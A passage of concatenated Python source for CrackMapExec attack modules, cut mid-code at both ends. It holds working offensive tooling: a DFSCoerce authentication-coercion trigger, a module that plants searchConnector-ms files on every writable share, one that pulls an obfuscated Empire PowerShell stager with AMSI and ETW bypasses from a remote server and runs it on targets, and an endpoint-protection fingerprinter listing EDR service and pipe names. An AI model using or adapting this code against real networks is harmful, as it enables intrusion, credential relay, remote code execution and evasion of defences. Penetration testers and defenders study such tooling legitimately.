__init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.listener = None\n\n    def options(self, context, module_options):\n        """"""\n        LISTENER    Listener Address (defaults to 127.0.0.1)\n        """"""\n        self.listener = ""127.0.0.1""\n        if ""LISTENER"" in module_options:\n            self.listener = module_options[""LISTENER""]\n\n    def on_login(self, context, connection):\n        trigger = TriggerAuth()\n        dce = trigger.connect(\n            username=connection.username,\n            password=connection.password,\n            domain=connection.domain,\n            lmhash=connection.lmhash,\n            nthash=connection.nthash,\n            target=connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain,\n            doKerberos=connection.kerberos,\n            dcHost=connection.kdcHost,\n            aesKey=connection.aesKey,\n        )\n\n        if dce is not None:\n            context.log.debug(""Target is vulnerable to DFSCoerce"")\n            trigger.NetrDfsRemoveStdRoot(dce, self.listener)\n            context.log.highlight(""VULNERABLE"")\n            context.log.highlight(""Next step: https://github.com/Wh04m1001/DFSCoerce"")\n            dce.disconnect()\n\n        else:\n            context.log.debug(""Target is not vulnerable to DFSCoerce"")\n\n\nclass DCERPCSessionError(DCERPCException):\n    def __init__(self, error_string=None, error_code=None, packet=None):\n        DCERPCException.__init__(self, error_string, error_code, packet)\n\n    def __str__(self):\n        key = self.error_code\n        if key in system_errors.ERROR_MESSAGES:\n            error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n            return ""DFSNM SessionError: code: 0x%x - %s - %s"" % (\n                self.error_code,\n                error_msg_short,\n                error_msg_verbose,\n            )\n        else:\n            return ""DFSNM SessionError: unknown error code: 0x%x"" % self.error_code\n\n\n################################################################################\n# RPC CALLS\n################################################################################\nclass NetrDfsRemoveStdRoot(NDRCALL):\n    opnum = 13\n    structure = (\n        (""ServerName"", WSTR),\n        (""RootShare"", WSTR),\n        (""ApiFlags"", DWORD),\n    )\n\n\nclass NetrDfsRemoveStdRootResponse(NDRCALL):\n    structure = ((""ErrorCode"", ULONG),)\n\n\nclass NetrDfsAddRoot(NDRCALL):\n    opnum = 12\n    structure = (\n        (""ServerName"", WSTR),\n        (""RootShare"", WSTR),\n        (""Comment"", WSTR),\n        (""ApiFlags"", DWORD),\n    )\n\n\nclass NetrDfsAddRootResponse(NDRCALL):\n    structure = ((""ErrorCode"", ULONG),)\n\n\nclass TriggerAuth:\n    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):\n        rpctransport = transport.DCERPCTransportFactory(r""ncacn_np:%s[\\PIPE\\netdfs]"" % target)\n        if hasattr(rpctransport, ""set_credentials""):\n            rpctransport.set_credentials(\n                username=username,\n                password=password,\n                domain=domain,\n                lmhash=lmhash,\n                nthash=nthash,\n                aesKey=aesKey,\n            )\n\n        if doKerberos:\n            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)\n        # if target:\n        #    rpctransport.setRemoteHost(target)\n\n        rpctransport.setRemoteHost(target)\n        dce = rpctransport.get_dce_rpc()\n        cme_logger.debug(""[-] Connecting to %s"" % r""ncacn_np:%s[\\PIPE\\netdfs]"" % target)\n        try:\n            dce.connect()\n        except Exception as e:\n            cme_logger.debug(""Something went wrong, check error status => %s"" % str(e))\n            return\n        try:\n            dce.bind(uuidtup_to_bin((""4FC742E0-4A10-11CF-8273-00AA004AE673"", ""3.0"")))\n        except Exception as e:\n            cme_logger.debug(""Something went wrong, check error status => %s"" % str(e))\n            return\n        cme_logger.debug(""[+] Successfully bound!"")\n        return dce\n\n    def NetrDfsRemoveStdRoot(self, dce, listener):\n        cme_logger.debug(""[-] Sending NetrDfsRemoveStdRoot!"")\n        try:\n            request = NetrDfsRemoveStdRoot()\n            request[""ServerName""] = ""%s\\x00"" % listener\n            request[""RootShare""] = ""test\\x00""\n            request[""ApiFlags""] = 1\n            if self.args.verbose:\n                cme_logger.debug(request.dump())\n            # logger.debug(request.dump())\n            resp = dce.request(request)\n\n        except Exception as e:\n            cme_logger.debug(e)\n', 'drop-sc.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport ntpath\n\n\nclass CMEModule:\n    """"""\n    Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\n    https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\n    Module by @zblurx\n    """"""\n\n    name = ""drop-sc""\n    description = ""Drop a searchConnector-ms file on each writable share""\n    supported_protocols = [""smb""]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\n        Module by @zblurx\n        URL         URL in the searchConnector-ms file, default https://rickroll\n        CLEANUP     Cleanup (choices: True or False)\n        SHARE       Specify a share to target\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\'s automatically added), default is ""Documents""\n        """"""\n        self.cleanup = False\n        if ""CLEANUP"" in module_options:\n            self.cleanup = bool(module_options[""CLEANUP""])\n\n        self.url = ""https://rickroll""\n        if ""URL"" in module_options:\n            self.url = str(module_options[""URL""])\n\n        self.sharename = """"\n        if ""SHARE"" in module_options:\n            self.sharename = str(module_options[""SHARE""])\n\n        self.filename = ""Documents""\n        if ""FILENAME"" in module_options:\n            self.filename = str(module_options[""FILENAME""])\n\n        self.file_path = ntpath.join(""\\\\"", f""{self.filename}.searchConnector-ms"")\n        if not self.cleanup:\n            self.scfile_path = f""/tmp/{self.filename}.searchConnector-ms""\n            scfile = open(self.scfile_path, ""w"")\n            scfile.truncate(0)\n            scfile.write(\'<?xml version=""1.0"" encoding=""UTF-8""?>\')\n            scfile.write(""<searchConnectorDescription"" \' xmlns=""http://schemas.microsoft.com/windows/2009/searchConnector"">\')\n            scfile.write(""<description>Microsoft Outlook</description>"")\n            scfile.write(""<isSearchOnlyItem>false</isSearchOnlyItem>"")\n            scfile.write(""<includeInStartMenuScope>true</includeInStartMenuScope>"")\n            scfile.write(f""<iconReference>{self.url}/0001.ico</iconReference>"")\n            scfile.write(""<templateInfo>"")\n            scfile.write(""<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>"")\n            scfile.write(""</templateInfo>"")\n            scfile.write(""<simpleLocation>"")\n            scfile.write(""<url>{}</url>"".format(self.url))\n            scfile.write(""</simpleLocation>"")\n            scfile.write(""</searchConnectorDescription>"")\n            scfile.close()\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        for share in shares:\n            context.log.debug(f""Share: {share}"")\n            if ""WRITE"" in share[""access""] and (share[""name""] == self.sharename if self.sharename != """" else share[""name""] not in [""C$"", ""ADMIN$""]):\n                context.log.success(f""Found writable share: {share[\'name\']}"")\n                if not self.cleanup:\n                    with open(self.scfile_path, ""rb"") as scfile:\n                        try:\n                            connection.conn.putFile(share[""name""], self.file_path, scfile.read)\n                            context.log.success(f""[OPSEC] Created {self.filename}.searchConnector-ms"" f"" file on the {share[\'name\']} share"")\n                        except Exception as e:\n                            context.log.exception(e)\n                            context.log.fail(f""Error writing {self.filename}.searchConnector-ms file"" f"" on the {share[\'name\']} share: {e}"")\n                else:\n                    try:\n                        connection.conn.deleteFile(share[""name""], self.file_path)\n                        context.log.success(f""Deleted {self.filename}.searchConnector-ms file on the"" f"" {share[\'name\']} share"")\n                    except Exception as e:\n                        context.log.fail(f""[OPSEC] Error deleting {self.filename}.searchConnector-ms"" f"" file on share {share[\'name\']}: {e}"")\n', 'empire_exec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport sys\nimport requests\nfrom requests import ConnectionError\n\n# The following disables the InsecureRequests warning and the \'Starting new HTTPS connection\' log message\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\n\nclass CMEModule:\n    """"""\n    Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""empire_exec""\n    description = ""Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it""\n    supported_protocols = [""smb"", ""mssql""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        LISTENER        Listener name to generate the launcher for\n        SSL             True if the listener is using SSL/TLS\n        OBFUSCATE       True if you want to use the built-in Obfuscation (that calls Invoke-Obfuscate)\n        OBFUSCATE_CMD   Override Invoke-Obfuscation command (Default is ""Token,All,1"" and is picked up by Defender)\n        """"""\n        self.empire_launcher = None\n\n        if ""LISTENER"" not in module_options:\n            context.log.fail(""LISTENER option is required!"")\n            sys.exit(1)\n\n        api_proto = ""https"" if ""SSL"" in module_options else ""http""\n\n        obfuscate = True if ""OBFUSCATE"" in module_options else False\n        # we can use commands instead of backslashes - this is because Linux and OSX treat them differently\n        default_obfuscation = ""Token,All,1""\n        obfuscate_cmd = module_options[""OBFUSCATE_CMD""] if ""OBFUSCATE_CMD"" in module_options else default_obfuscation\n        context.log.debug(f""Obfuscate: {obfuscate} - Obfuscate_cmd: {obfuscate_cmd}"")\n\n        # Pull the host and port from the config file\n        base_url = f""{api_proto}://{context.conf.get(\'Empire\', \'api_host\')}:{context.conf.get(\'Empire\', \'api_port\')}""\n        context.log.debug(f""Empire URL: {base_url}"")\n\n        # Pull the username and password from the config file\n        empire_creds = {\n            ""username"": context.conf.get(""Empire"", ""username""),\n            ""password"": context.conf.get(""Empire"", ""password""),\n        }\n        context.log.debug(f""Empire Creds: {empire_creds}"")\n\n        try:\n            login_response = requests.post(\n                f""{base_url}/token"",\n                data=empire_creds,\n                verify=False,\n            )\n        except ConnectionError as e:\n            context.log.fail(f""Unable to login to Empire\'s RESTful API: {e}"")\n            sys.exit(1)\n        context.log.debug(f""Response Code: {login_response.status_code}"")\n        context.log.debug(f""Response Content: {login_response.text}"")\n\n        if login_response.status_code == 200:\n            access_token = login_response.json()[""access_token""]\n            headers = {""Authorization"": f""Bearer {access_token}""}\n        else:\n            context.log.fail(""Error authenticating to Empire\'s RESTful API"")\n            sys.exit(1)\n\n        data = {\n            ""name"": ""cme_ephemeral"",\n            ""template"": ""multi_launcher"",\n            ""options"": {\n                ""Listener"": module_options[""LISTENER""],\n                ""Language"": ""powershell"",\n                ""StagerRetries"": ""0"",\n                ""OutFile"": """",\n                ""Base64"": ""True"",\n                ""Obfuscate"": obfuscate,\n                ""ObfuscateCommand"": obfuscate_cmd,\n                ""SafeChecks"": ""True"",\n                ""UserAgent"": ""default"",\n                ""Proxy"": ""default"",\n                ""ProxyCreds"": ""default"",\n                ""Bypasses"": ""mattifestation etw"",\n            },\n        }\n        try:\n            stager_response = requests.post(\n                f""{base_url}/api/v2/stagers?save=False"",\n                json=data,\n                headers=headers,\n                verify=False,\n            )\n        except ConnectionError:\n            context.log.fail(f""Unable to request stager from Empire\'s RESTful API"")\n            sys.exit(1)\n\n        if stager_response.status_code not in [200, 201]:\n            if ""not found"" in stager_response.json()[""detail""]:\n                context.log.fail(f""Listener {module_options[\'LISTENER\']} not found"")\n            else:\n                context.log.fail(f""Stager response received a non-200 when creating stager: {stager_response.status_code} {stager_response.text}"")\n            sys.exit(1)\n\n        context.log.debug(f""Response Code: {stager_response.status_code}"")\n        # context.log.debug(f""Response Content: {stager_response.text}"")\n\n        stager_create_data = stager_response.json()\n        context.log.debug(f""Stager data: {stager_create_data}"")\n        download_uri = stager_create_data[""downloads""][0][""link""]\n\n        download_response = requests.get(\n            f""{base_url}{download_uri}"",\n            headers=headers,\n            verify=False,\n        )\n        context.log.debug(f""Response Code: {download_response.status_code}"")\n        # context.log.debug(f""Response Content: {download_response.text}"")\n\n        self.empire_launcher = download_response.text\n\n        if download_response.status_code == 200:\n            context.log.success(f""Successfully generated launcher for listener \'{module_options[\'LISTENER\']}\'"")\n        else:\n            context.log.fail(f""Something went wrong when retrieving stager Powershell command"")\n\n    def on_admin_login(self, context, connection):\n        if self.empire_launcher:\n            connection.execute(self.empire_launcher)\n            context.log.success(""Executed Empire Launcher"")\n', 'enum_av.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# All credit to @an0n_r0\n# project : https://github.com/tothi/serviceDetector\n\nfrom impacket.dcerpc.v5 import lsat, lsad\nfrom impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED, RPC_UNICODE_STRING\nfrom impacket.dcerpc.v5 import transport\nimport pathlib\n\n\nclass CMEModule:\n    """"""\n    Uses LsarLookupNames and NamedPipes to gather information on all endpoint protection solutions installed on the the remote host(s)\n    Module by @mpgn_x64\n    """"""\n\n    name = ""enum_av""\n    description = ""Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """""" """"""\n        pass\n\n    def on_login(self, context, connection):\n        success = 0\n        results = {}\n        target = connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain\n        context.log.debug(""Detecting installed services on {} using LsarLookupNames()..."".format(target))\n\n        try:\n            lsa = LsaLookupNames(\n                connection.domain,\n                connection.username,\n                connection.password,\n                target,\n                connection.kerberos,\n                connection.domain,\n                connection.lmhash,\n                connection.nthash,\n                connection.aesKey,\n            )\n            dce, rpctransport = lsa.connect()\n            policyHandle = lsa.open_policy(dce)\n\n            for i, product in enumerate(conf[""products""]):\n                for service in product[""services""]:\n                    try:\n                        lsa.LsarLookupNames(dce, policyHandle, service[""name""])\n                        context.log.info(f""Detected installed service on {connection.host}: {product[\'name\']} {service[\'description\']}"")\n                        if product[""name""] not in results:\n                            results[product[""name""]] = {""services"": []}\n                        results[product[""name""]][""services""].append(service)\n                    except Exception as e:\n                        pass\n            success += 1\n        except Exception as e:\n            context.log.fail(str(e))\n\n        context.log.info(f""Detecting running processes on {connection.host} by enumerating pipes..."")\n        try:\n            for f in connection.conn.listPath(""IPC$"", ""\\\\*""):\n                fl = f.get_longname()\n                for i, product in enumerate(conf[""products""]):\n                    for pipe in product[""pipes""]:\n                        if pathlib.PurePath(fl).match(pipe[""name""]):\n                            context.log.debug(f""{product[\'name\']} running claim found on {connection.host} by existing pipe {fl} (likely processes: {pipe[\'processes\']})"")\n                            if product[""name""] not in results:\n                                results[product[""name""]] = {}\n                            if ""pipes"" not in results[product[""name""]]:\n                                results[product[""name""]][""pipes""] = []\n                            results[product[""name""]][""pipes""].append(pipe)\n            success += 1\n        except Exception as e:\n            context.log.debug(str(e))\n\n        self.dump_results(results, connection.hostname, success, context)\n\n    def dump_results(self, results, remoteName, success, context):\n        # out1 = ""On host {} found"".format(remoteName)\n        out1 = """"\n        for item in results:\n            out = out1\n            if ""services"" in results[item]:\n                out += f""{item} INSTALLED""\n                if ""pipes"" in results[item]:\n                    out += "" and it seems to be RUNNING""\n                # else:\n                #     for product in conf[\'products\']:\n                #         if (item == product[\'name\']) and (len(product[\'pipes\']) == 0):\n                #             out += "" (NamedPipe for this service was not provided in config)""\n            elif ""pipes"" in results[item]:\n                out += f"" {item} RUNNING""\n            context.log.highlight(out)\n        if (len(results) < 1) and (success > 1):\n            out = out1 + "" NOTHING!""\n            context.log.highlight(out)\n\n\nclass LsaLookupNames:\n    timeout = None\n    authn_level = None\n    protocol = None\n    transfer_syntax = None\n    machine_account = False\n\n    iface_uuid = lsat.MSRPC_UUID_LSAT\n    authn = True\n\n    def __init__(\n        self,\n        domain="""",\n        username="""",\n        password="""",\n        remote_name="""",\n        k=False,\n        kdcHost="""",\n        lmhash="""",\n        nthash="""",\n        aesKey="""",\n    ):\n        self.domain = domain\n        self.username = username\n        self.password = password\n        self.remoteName = remote_name\n        self.string_binding = rf""ncacn_np:{remote_name}[\\PIPE\\lsarpc]""\n        self.doKerberos = k\n        self.lmhash = lmhash\n        self.nthash = nthash\n        self.aesKey = aesKey\n        self.dcHost = kdcHost\n\n    def connect(self, string_binding=None, iface_uuid=None):\n        """"""Obtains a RPC Transport and a DCE interface according to the bindings and\n        transfer syntax specified.\n        :return: tuple of DCE/RPC and RPC Transport objects\n        :rtype: (DCERPC_v5, DCERPCTransport)\n        """"""\n        string_binding = string_binding or self.string_binding\n        if not string_binding:\n            raise NotImplemented(""String binding must be defined"")\n\n        rpc_transport = transport.DCERPCTransportFactory(string_binding)\n\n        # Set timeout if defined\n        if self.timeout:\n            rpc_transport.set_connect_timeout(self.timeout)\n\n        # Authenticate if specified\n        if self.authn and hasattr(rpc_transport, ""set_credentials""):\n            # This method exists only for selected protocol sequences.\n            rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey)\n\n        if self.doKerberos:\n            rpc_transport.set_kerberos(self.doKerberos, kdcHost=self.dcHost)\n\n        # Gets the DCE RPC object\n        dce = rpc_transport.get_dce_rpc()\n\n        # Set the authentication level\n        if self.authn_level:\n            dce.set_auth_level(self.authn_level)\n\n        # Connect\n        dce.connect()\n\n        # Bind if specified\n        iface_uuid = iface_uuid or self.iface_uuid\n        if iface_uuid and self.transfer_syntax:\n            dce.bind(iface_uuid, transfer_syntax=self.transfer_syntax)\n        elif iface_uuid:\n            dce.bind(iface_uuid)\n\n        return dce, rpc_transport\n\n    def open_policy(self, dce):\n        request = lsad.LsarOpenPolicy2()\n        request[""SystemName""] = NULL\n        request[""ObjectAttributes""][""RootDirectory""] = NULL\n        request[""ObjectAttributes""][""ObjectName""] = NULL\n        request[""ObjectAttributes""][""SecurityDescriptor""] = NULL\n        request[""ObjectAttributes""][""SecurityQualityOfService""] = NULL\n        request[""DesiredAccess""] = MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES\n        resp = dce.request(request)\n        return resp[""PolicyHandle""]\n\n    def LsarLookupNames(self, dce, policyHandle, service):\n        request = lsat.LsarLookupNames()\n        request[""PolicyHandle""] = policyHandle\n        request[""Count""] = 1\n        name1 = RPC_UNICODE_STRING()\n        name1[""Data""] = ""NT Service\\{}"".format(service)\n        request[""Names""].append(name1)\n        request[""TranslatedSids""][""Sids""] = NULL\n        request[""LookupLevel""] = lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta\n        resp = dce.request(request)\n        return resp\n\n\nconf = {\n    ""products"": [\n        {\n            ""name"": ""Bitdefender"",\n            ""services"": [\n                {\n                    ""name"": ""bdredline_agent"",\n                    ""description"": ""Bitdefender Agent RedLine Service"",\n                },\n                {""name"": ""BDAuxSrv"", ""description"": ""Bitdefender Auxiliary Service""},\n                {\n                    ""name"": ""UPDATESRV"",\n                    ""description"": ""Bitdefender Desktop Update Service"",\n                },\n                {""name"": ""VSSERV"", ""description"": ""Bitdefender Virus Shield""},\n                {""name"": ""bdredline"", ""description"": ""Bitdefender RedLine Service""},\n                {""name"": ""EPRedline"", ""description"": ""Bitdefender Endpoint Redline Service""},\n                {""name"": ""EPUpdateService"", ""description"": ""Bitdefender Endpoint Update Service""},\n                {""name"": ""EPSecurityService"", ""description"": ""Bitdefender Endpoint Security Service""},\n                {""name"": ""EPProtectedService"", ""description"": ""Bitdefender Endpoint Protected Service""},\n                {""name"": ""EPIntegrationService"", ""description"": ""Bitdefender Endpoint Integration Service""},\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""\\\\bdConnector\\\\ServiceControl\\\\EPSecurityService.exe"",\n                    ""processes"": [""EPConsole.exe""],\n                },\n                {\n                    ""name"": ""etw_sensor_pipe_ppl"",\n                    ""processes"": [""EPProtectedService.exe""],\n                },\n                {\n                    ""name"": ""local\\\\msgbus\\\\antitracker.low\\\\*"",\n                    ""processes"": [""bdagent.exe""],\n                },\n                {\n                    ""name"": ""local\\\\msgbus\\\\aspam.actions.low\\\\*"",\n                    ""processes"": [""bdagent.exe""],\n                },\n                {\n                    ""name"": ""local\\\\msgbus\\\\bd.process.broker.pipe"",\n                    ""processes"": [""bdagent.exe"", ""bdservicehost.exe"", ""updatesrv.exe""],\n                },\n                {""name"": ""local\\\\msgbus\\\\bdagent*"", ""processes"": [""bdagent.exe""]},\n                {\n                    ""name"": ""local\\\\msgbus\\\\bdauxsrv"",\n                    ""processes"": [""bdagent.exe"", ""bdntwrk.exe""],\n                },\n            ],\n        },\n        {\n            ""name"": ""Windows Defender"",\n            ""services"": [\n                {\n                    ""name"": ""WinDefend"",\n                    ""description"": ""Windows Defender Antivirus Service"",\n                },\n                {\n                    ""name"": ""Sense"",\n                    ""description"": ""Windows Defender Advanced Threat Protection Service"",\n                },\n                {\n                    ""name"": ""WdNisSvc"",\n                    ""description"": ""Windows Defender Antivirus Network Inspection Service"",\n                },\n            ],\n            ""pipes"": [],\n        },\n        {\n            ""name"": ""ESET"",\n            ""services"": [\n                {""name"": ""ekm"", ""description"": ""ESET""},\n                {""name"": ""epfw"", ""description"": ""ESET""},\n                {""name"": ""epfwlwf"", ""description"": ""ESET""},\n                {""name"": ""epfwwfp"", ""description"": ""ESET""},\n                {""name"": ""EraAgentSvc"", ""description"": ""ESET""},\n            ],\n            ""pipes"": [{""name"": ""nod_scriptmon_pipe"", ""processes"": [""""]}],\n        },\n        {\n            ""name"": ""CrowdStrike"",\n            ""services"": [\n                {\n                    ""name"": ""CSFalconService"",\n                    ""description"": ""CrowdStrike Falcon Sensor Service"",\n                }\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""CrowdStrike\\\\{*"",\n                    ""processes"": [""CSFalconContainer.exe"", ""CSFalconService.exe""],\n                }\n            ],\n        },\n        {\n            ""name"": ""SentinelOne"",\n            ""services"": [\n                {\n                    ""name"": ""SentinelAgent"",\n                    ""description"": ""SentinelOne Endpoint Protection Agent"",\n                },\n                {\n                    ""name"": ""SentinelStaticEngine"",\n                    ""description"": ""Manage static engines for SentinelOne Endpoint Protection"",\n                },\n                {\n                    ""name"": ""LogProcessorService"",\n                    ""description"": ""Manage logs for SentinelOne Endpoint Protection"",\n                },\n            ],\n            ""pipes"": [\n                {""name"": ""SentinelAgentWorkerCert.*"", ""processes"": [""""]},\n                {""name"": ""DFIScanner.Etw.*"", ""processes"": [""SentinelStaticEngine.exe""]},\n                {""name"": ""DFIScanner.Inline.*"", ""processes"": [""SentinelAgent.exe""]},\n            ],\n        },\n        {\n            ""name"": ""Carbon Black App Control"",\n            ""services"": [{""name"": ""Parity"", ""description"": ""Carbon Black App Control Agent""}],\n            ""pipes"": [],\n        },\n        {\n            ""name"": ""Cybereason"",\n            ""services"": [\n                {\n                    ""name"": ""CybereasonActiveProbe"",\n                    ""description"": ""Cybereason Active Probe"",\n                },\n                {""name"": ""CybereasonCRS"", ""description"": ""Cybereason Anti-Ransomware""},\n                {\n                    ""name"": ""CybereasonBlocki"",\n                    ""description"": ""Cybereason Execution Prevention"",\n                },\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""CybereasonAPConsoleMinionHostIpc_*"",\n                    ""processes"": [""minionhost.exe""],\n                },\n                {\n                    ""name"": ""CybereasonAPServerProxyIpc_*"",\n                    ""processes"": [""minionhost.exe""],\n                },\n            ],\n        },\n        {\n            ""name"": ""Kaspersky Security for Windows Server"",\n            ""services"": [\n                {\n                    ""name"": ""kavfsslp"",\n                    ""description"": ""Kaspersky Security Exploit Prevention Service"",\n                },\n                \n                {\n                    ""name"": ""KAVFS"",\n                    ""description"": ""Kaspersky Security Service"",\n                },\n\n                {\n                    ""name"": ""KAVFSGT"",\n                    ""description"": ""Kaspersky Security Management Service"",\n                },\n                \n                {\n                    ""name"": ""klnagent"",\n                    ""description"": ""Kaspersky Security Center"",\n                },\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""Exploit_Blocker"",\n                    ""processes"": [""kavfswh.exe""],\n                },\n                \n            ],\n        },  \n        {\n            ""name"": ""Trend Micro Endpoint Security"",\n            ""services"": [\n                {\n                    ""name"": ""Trend Micro Endpoint Basecamp"",\n                    ""description"": ""Trend Micro Endpoint Basecamp"",\n                },\n                \n                {\n                    ""name"": ""TMBMServer"",\n                    ""description"": ""Trend Micro Unauthorized Change Prevention Service"",\n                },\n\n                {\n                    ""name"": ""Trend Micro Web Service Communicator"",\n                    ""description"": ""Trend Micro Web Service Communicator"",\n                },\n                \n                {\n                    ""name"": ""TMiACAgentSvc"",\n                    ""description"": ""Trend Micro Application Control Service (Agent)"",\n                },\n                {                \n                    ""name"": ""CETASvc"",\n                    ""description"": ""Trend Micro Cloud Endpoint Telemetry Service"",\n                },\n                {\n                                \n                    ""name"": ""iVPAgent"",\n                    ""description"": ""Trend Micro Vulnerability Protection Service (Agent)"",\n                }                 \n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""IPC_XBC_XBC_AGENT_PIPE_*"",\n                    ""processes"": [""EndpointBasecamp.exe""],\n                },\n                {\n                    ""name"": ""iacagent_*"",\n                    ""processes"": [""TMiACAgentSvc.exe""],\n                },\n                {\n                    ""name"": ""OIPC_LWCS_PIPE_*"",\n                    ""processes"": [""TmListen.exe""],\n                },\n                {\n                    ""name"": ""Log_ServerNamePipe"",\n                    ""processes"": [""LogServer.exe""],\n                },\n                {\n                    ""name"": ""OIPC_NTRTSCAN_PIPE_*"",\n                    ""processes"": [""Ntrtscan.exe""],\n                },\n            ],\n        },  \n        {\n            ""name"": ""Symantec Endpoint Protection"",\n            ""services"": [\n                {\n                    ""name"": ""SepMasterService"",\n                    ""description"": ""Symantec Endpoint Protection"",\n                },\n                {\n                    ""name"": ""SepScanService"",\n                    ""description"": ""Symantec Endpoint Protection Scan Services"",\n                },\n                {""name"": ""SNAC"", ""description"": ""Symantec Network Access Control""},\n            ],\n            ""pipes"": [],\n        },\n        {\n            ""name"": ""Sophos Intercept X"",\n            ""services"": [\n                {\n                ""name"": ""SntpService"",\n                ""description"": ""Sophos Network Threat Protection""\n                },\n                {\n                ""name"": ""Sophos Endpoint Defense Service"",\n                ""description"": ""Sophos Endpoint Defense Service""\n                },\n                {\n                ""name"": ""Sophos File Scanner Service"",\n                ""description"": ""Sophos File Scanner Service""\n                },\n                {\n                ""name"": ""Sophos Health Service"",\n                ""description"": ""Sophos Health Service""\n                },\n                {\n                ""name"": ""Sophos Live Query"",\n                ""description"": ""Sophos Live Query""\n                },\n                {\n                ""name"": ""Sophos Managed Threat Response"",\n                ""description"": ""Sophos Managed Threat Response""\n                },\n                {\n                ""name"": ""Sophos MCS Agent"",\n                ""description"": ""Sophos MCS Agent""\n                },\n                {\n                ""name"": ""Sophos MCS Client"",\n                ""description"": ""Sophos MCS Client""\n                },\n                {\n                ""name"": ""Sophos System Protection Service"",\n                ""description"": ""Sophos System Protection Service""\n                }\n            ],\n            ""pipes"": [\n                {""name"": ""SophosUI"", ""processes"": [""""]},\n                {""name"": ""SophosEventStore"", ""processes"": [""""]},\n                {""name"": ""sophos_deviceencryption"", ""processes"": [""""]},\n                {""name"": ""sophoslivequery_*"", ""processes"": [""""]},\n            ],\n        },\n        {\n            ""name"": ""G DATA Security Client"",\n            ""services"": [\n                {\n                    ""name"": ""AVKWCtl"",\n                    ""description"": ""Anti-virus Kit Window Control"",\n                },\n                {\n                    ""name"": ""AVKProxy"", \n                    ""description"": ""G Data AntiVirus Proxy Service""\n                },\n                {\n                    ""name"": ""GDScan"",\n                    ""description"": ""GDSG Data AntiVirus Scan Service"",\n                },\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""exploitProtectionIPC"",\n                    ""processes"": [""AVKWCtlx64.exe""],\n                },\n            ],\n        },\n        {\n            ""name"": ""Panda Adaptive Defense 360"",\n            ""services"": [\n                {\n                    ""name"": ""PandaAetherAgent"",\n                    ""description"": ""Panda Endpoint Agent"",\n                },\n                {\n                    ""name"": ""PSUAService"", \n                    ""description"": ""Panda Product Service""\n                },\n                {\n                    ""name"": ""NanoServiceMain"",\n                    ""description"": ""Panda Cloud Antivirus Service"",\n                },\n            ],\n            ""pipes"": [\n                {\n                    ""name"": ""NNS_API_IPC_SRV_ENDPOINT"",\n                    ""processes"": [""PSANHost.exe""],\n                },\n                {\n                    ""name"": ""PSANMSrvcPpal"",\n                    ""processes"": [""PSUAService.exe""],\n                },\n            ],\n        }\n        \n    ]\n}\n', 'enum_dns.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom datetime import datetime\nfrom cme.helpers.logger import write_log\n\n\nclass CMEModule:\n    """"""\n    Uses WMI to dump DNS from an AD DNS Server.\n    Module by @fang0654\n    """"""\n\n    name = ""enum_dns""\n    description = ""Uses WMI to dump DNS from an AD DNS Server""\n    supported_protocols = [""smb"", ""wmi""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.domains = None\n\n    def options(self, context, module_options):\n        """"""\n        DOMAIN  Domain to enumerate DNS for. Defaults to all zones.\n        """"""\n        self.domains = None\n        if module_options and ""DOMAIN"" in module_options:\n            self.domains = module_options[""DOMAIN""]\n\n    def on_admin_login(self, context, connection):\n        if not self.domains:\n            domains = []\n            output = connection.wmi(""Select Name FROM MicrosoftDNS_Zone"", ""root\\\\microsoftdns"")\n\n            if output:\n                for result in output:\n                    domains.append(result[""Name""][""value""])\n\n                context.log.success(""Domains retrieved: {}"".format(domains))\n        else:\n            domains = [self.domains]\n        data = """"\n        for domain in domains:\n            output = connection.wmi(\n                f""Select TextRepresentation FROM MicrosoftDNS_ResourceRecord WHERE DomainName = {domain}"",\n                ""root\\\\microsoftdns"",\n            )\n\n            if output:\n                domain_data = {}\n                context.log.highlight(f""Results for {domain}"")\n                data += f""Results for {domain}\\n""\n                for entry in output:\n                    text = entry[""TextRepresentation""][""value""]\n                    rname = text.split("" "")[0]\n                    rtype = text.split("" "")[2]\n                    rvalue = "" "".join(text.split("" "")[3:])\n                    if domain_data.get(rtype, 